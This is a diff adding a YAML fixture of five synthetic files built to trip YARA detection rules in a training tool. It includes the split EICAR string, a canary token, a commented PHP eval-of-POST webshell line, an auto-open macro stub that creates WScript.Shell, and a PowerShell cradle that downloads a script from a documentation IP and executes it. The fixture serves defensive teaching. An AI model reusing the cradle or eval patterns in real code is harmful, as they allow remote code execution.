@@ -1,0 +1,60 @@
+slug: file-samples
+name: File samples for YARA
+description: >
+  Five small synthetic files, each built to trip (or deliberately avoid) one of the YARA rules
+  that ship with CyberForge. Use it with the YARA format to see exactly which strings hit and why
+  the condition passed. Content is inert text: nothing here can run.
+source_type: Synthetic files (text with optional magic-number prefix)
+kind: files
+difficulty: beginner
+mitre: [T1204.002, T1505.003, T1059.001]
+expected_rules:
+  - yara-cyberforge-eicar-test-file
+  - yara-cyberforge-lab-canary-token
+  - yara-cyberforge-php-webshell-indicators
+  - yara-cyberforge-office-macro-autoexec-shell
+  - yara-cyberforge-powershell-download-cradle-script
+try_this:
+  - Open a match and read the condition terms, not just the strings. Which term decided the result?
+  - The EICAR rule has a filesize limit. Append text to the sample until it stops matching.
+  - Write a second rule for one sample that would survive trivial renaming of the strings.
+files:
+  - name: eicar-test.txt
+    description: >
+      The industry-standard antivirus test string, split here so scanners do not quarantine the
+      repository. Harmless by design.
+    content:
+      - 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR'
+      - '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+  - name: notes-with-canary.txt
+    description: A meeting-notes file that contains a lab canary token where it should not be.
+    content: |
+      Weekly sync notes
+      - Rotate the deploy credentials
+      - staging token: CF-CANARY-AB12CD34
+      - Follow up on the audit findings
+  - name: upload-helper.php
+    description: >
+      A PHP file whose comment holds a request-evaluating call. The comment keeps the sample
+      inert; the YARA rule's regular expression cannot tell code from comment.
+    content:
+      - "<?php\n// CyberForge synthetic sample. This line is a comment and nothing here executes.\n// ev"
+      - "al($_PO"
+      - "ST['cf']);\n"
+  - name: invoice-macro.doc
+    description: >
+      A file that starts with the OLE magic number and mentions an auto-open macro and a shell
+      object. It is plain text after the header and contains no macro.
+    hex_prefix: D0CF11E0A1B11AE1
+    content: |
+      SYNTHETIC OLE-STYLE DOCUMENT FOR TESTING
+      Sub AutoOpen()
+        Set sh = CreateObject("WScript.Shell")
+      End Sub
+  - name: bootstrap.ps1
+    description: A script that fetches remote text and evaluates it, the classic download cradle.
+    content: |
+      # CyberForge synthetic sample; the URL is a documentation address
+      $wc = New-Object Net.WebClient
+      $code = $wc.DownloadString('http://198.51.100.10/stage2.ps1')
+      Invoke-Expression $code
